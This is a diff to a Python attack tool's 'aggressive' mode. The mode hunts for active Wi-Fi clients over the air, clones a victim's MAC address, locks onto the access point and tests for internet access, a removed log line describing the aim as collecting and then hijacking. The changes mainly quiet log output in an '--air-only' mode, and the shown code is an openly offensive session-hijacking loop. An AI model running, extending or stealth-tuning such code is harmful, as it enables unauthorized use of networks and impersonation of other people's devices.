@@ -128,9 +128,6 @@ def run_aggressive(args) -> bool:
 
     # Continuous Active-Triggered Air-Only Hunting Loop (--air-only 0)
     if is_continuous_air_only:
-        log_main(f"[+] Continuous Air-Only hunting mode active (--air-only 0).")
-        log_main(f"[*] Attack will run until an active target is detected, then collect for 30s and hijack.")
-        
         cycle = 1
         last_skip_time = 0
         persisted_bssid_targets = None
@@ -156,7 +153,6 @@ def run_aggressive(args) -> bool:
 
             bssids = scan_bssids_for_ssid(ssid)
             if not bssids:
-                log_main(f"[-] No BSSIDs found for SSID '{ssid}'. Retrying in 2s...")
                 time.sleep(2.0)
                 cycle += 1
                 continue
@@ -166,12 +162,11 @@ def run_aggressive(args) -> bool:
             if persisted_bssid_targets:
                 bssids = [b for b in bssids if b.get("bssid", "").lower() in persisted_bssid_targets]
             if not bssids:
-                log_main(f"[-] All discovered BSSIDs for SSID '{ssid}' are blacklisted or filtered. Retrying in 2s...")
                 time.sleep(2.0)
                 cycle += 1
                 continue
 
-            log_main(f"\n[Cycle #{cycle}] Hunting for active 802.11 client sessions (--air-only 0)...")
+            log_main(f"[Cycle #{cycle}] Hunting...")
             set_main_status(interface=interface, profile=profile, ssid=ssid, status=f"Air Sniffing (Hunting) [#{cycle}]")
 
             target_bssid_list = [b["bssid"] for b in bssids]
@@ -216,7 +211,8 @@ def run_aggressive(args) -> bool:
                 bssids,
                 air_clients_map,
                 select_req,
-                prioritize_clients=prioritize_clients
+                prioritize_clients=prioritize_clients,
+                is_air_only=is_air_only
             )
             if cycle == 1 and getattr(args, "select_bssid", False) and ranked_bssids:
                 persisted_bssid_targets = {b["bssid"].lower() for b in ranked_bssids}
@@ -245,7 +241,8 @@ def run_aggressive(args) -> bool:
 
                 if not new_air_clients and bssid_air_clients:
                     # If all active clients were previously tried in earlier cycles, reset tried_macs to allow re-testing
-                    log_main(f"  [i] All active targets on BSSID {target_bssid} were previously attempted. Resetting tried target history...")
+                    if not is_air_only:
+                        log_main(f"  [i] All active targets on BSSID {target_bssid} were previously attempted. Resetting tried target history...")
                     tried_macs.clear()
                     new_air_clients = filter_valid_air_clients(
                         bssid_air_clients, tried_macs, auto_params, bssids, air_clients_map=air_clients_map, active_only=True
@@ -262,7 +259,8 @@ def run_aggressive(args) -> bool:
 
                     msg = f"[{idx}/{len(ranked_bssids)}] Target: {target_bssid} (Sig: {signal_pct}%, Ch: {chan})"
                     log_info(msg)
-                    log_main(f"\n{msg}")
+                    if not is_air_only:
+                        log_main(f"\n{msg}")
 
                     if is_monitor_mode_active(interface):
                         set_managed_mode(interface)
@@ -271,7 +269,8 @@ def run_aggressive(args) -> bool:
                     set_mac_address(interface, attack_mac, profile=profile)
 
                     if not lock_bssid(target_bssid, profile):
-                        log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
+                        if not is_air_only:
+                            log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
                         continue
 
                     wait_for_carrier(interface, timeout=6.0)
@@ -306,7 +305,6 @@ def run_aggressive(args) -> bool:
                     log_main(f"\033[93m[-] Skipping BSSID {target_bssid} (Ctrl+C)...\033[0m")
                     continue
 
-            log_main(f"[-] Cycle #{cycle} completed without verified internet. Resuming monitor mode to hunt for active targets...")
             if profile:
                 _run(["nmcli", "connection", "modify", profile, "802-11-wireless.bssid", ""], debug=False)
                 _run(["nmcli", "connection", "modify", profile, "802-11-wireless.cloned-mac-address", ""], debug=False)
@@ -337,6 +335,8 @@ def run_aggressive(args) -> bool:
     # 3. If --air mode is enabled, sniff over-the-air Dot11 frames in monitor mode FIRST
     air_clients_map = {}
     if is_air:
+        if is_air_only:
+            log_main(f"[Cycle #1] Hunting...")
         target_bssid_list = [b["bssid"] for b in bssids]
         target_channel_list = [b["chan"] for b in bssids if b.get("chan")]
 
@@ -352,7 +352,8 @@ def run_aggressive(args) -> bool:
         if not user_specified_duration and unique_channels and air_duration > 0:
             scaled_dur = calculate_scaled_air_duration(air_duration, len(unique_channels))
             if scaled_dur > air_duration:
-                log_main(f"[*] Auto-scaling air sniff duration to {scaled_dur}s for {len(unique_channels)} target channels.")
+                if not is_air_only:
+                    log_main(f"[*] Auto-scaling air sniff duration to {scaled_dur}s for {len(unique_channels)} target channels.")
                 air_duration = scaled_dur
                 set_main_status(status=f"Air Sniffing ({air_duration}s)")
 
@@ -388,13 +389,15 @@ def run_aggressive(args) -> bool:
                         pooled_air_clients[mac] = ip
 
     if any_bssid_mode and is_air:
-        log_main(f"[+] --any-bssid enabled: Pooled {len(pooled_air_clients)} client(s) across all BSSIDs for target testing.")
+        if not is_air_only:
+            log_main(f"[+] --any-bssid enabled: Pooled {len(pooled_air_clients)} client(s) across all BSSIDs for target testing.")
 
     bssids = display_and_select_bssid(
         bssids,
         air_clients_map,
         getattr(args, "select_bssid", False),
-        prioritize_clients=prioritize_clients
+        prioritize_clients=prioritize_clients,
+        is_air_only=is_air_only
     )
 
     tried_macs = set()
@@ -404,7 +407,8 @@ def run_aggressive(args) -> bool:
         target_bssid = item["bssid"]
         if is_blacklisted(target_bssid, blacklist):
             trace(f"[FEATURE] Skipping blacklisted target BSSID: {target_bssid}")
-            log_main(f"  [-] Skipping blacklisted BSSID: {target_bssid}")
+            if not is_air_only:
+                log_main(f"  [-] Skipping blacklisted BSSID: {target_bssid}")
             continue
 
         signal_pct = item["signal"]
@@ -419,7 +423,8 @@ def run_aggressive(args) -> bool:
 
             msg = f"[{idx}/{len(bssids)}] Target: {target_bssid} (Sig: {signal_pct}%, Ch: {chan})"
             log_info(msg)
-            log_main(f"\n{msg}")
+            if not is_air_only:
+                log_main(f"\n{msg}")
 
             if is_monitor_mode_active(interface):
                 set_managed_mode(interface)
@@ -429,7 +434,8 @@ def run_aggressive(args) -> bool:
             set_mac_address(interface, attack_mac, profile=profile)
 
             if not lock_bssid(target_bssid, profile):
-                log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
+                if not is_air_only:
+                    log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
                 continue
 
             wait_for_carrier(interface, timeout=6.0)
@@ -465,7 +471,6 @@ def run_aggressive(args) -> bool:
 
             if is_air_only:
                 log_info(f"Skipping subnet scanning on BSSID {target_bssid} (--air-only enabled).")
-                log_main(f"  [*] Skipping subnet scanning on BSSID {target_bssid} (--air-only enabled).")
             else:
                 log_step(f"Scanning subnet on BSSID {target_bssid}...")
                 log_main(f"  -> Scanning subnet on BSSID {target_bssid}...")
@@ -483,7 +488,8 @@ def run_aggressive(args) -> bool:
                         return True
 
             log_warning(f"No internet on BSSID {target_bssid}. Moving next...")
-            log_main(f"  [-] No internet on BSSID {target_bssid}. Moving next...")
+            if not is_air_only:
+                log_main(f"  [-] No internet on BSSID {target_bssid}. Moving next...")
 
         except (KeyboardInterrupt, MainSkipInterrupt):
             now = time.time()
@@ -508,7 +514,8 @@ def run_aggressive(args) -> bool:
             continue
 
     log_warning("Aggressive completed all BSSIDs without internet access.")
-    log_main("[-] Aggressive completed all BSSIDs without internet access.")
+    if not is_air_only:
+        log_main("[-] Aggressive completed all BSSIDs without internet access.")
     if is_monitor_mode_active(interface):
         set_managed_mode(interface)
     return False
